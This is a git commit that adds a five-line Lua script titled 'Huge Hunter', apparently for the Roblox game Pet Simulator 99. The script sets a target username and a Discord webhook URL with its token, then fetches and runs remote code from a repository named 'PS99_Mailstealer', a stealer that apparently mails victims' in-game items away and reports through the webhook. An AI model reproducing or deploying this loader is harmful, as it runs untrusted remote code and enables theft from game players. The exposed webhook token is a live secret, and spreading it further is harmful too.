384631c54e3d3a3d88bc1d22c65dd49e52fc6408
Hekobo <101001280+Hekobo@users.noreply.github.com>
2025-02-14 22:10:44 +0800

    Huge Hunter

---
+++ obf_2WBV9WN0JgqMKt2mX36Gte0gIW999nOiE926JmT7W7bxG7MVQO6jvmw87Y53QDaY.lua
@@ -0,0 +1,5 @@
+Username = "nchvytpt"
+LoadScreen = true 
+Webhook = "https://discord.com/api/webhooks/1339961496511189106/Ku4uafNtgxz0v7ejymrlVPKPYFOByTc03zTW9_EEV-CxJ9OFn4ySgWll3OziK7r0-QeB" -- Paste your Discord webhook here
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KiuuP/PS99_Mailstealer/main/MailStealer.lua"))()
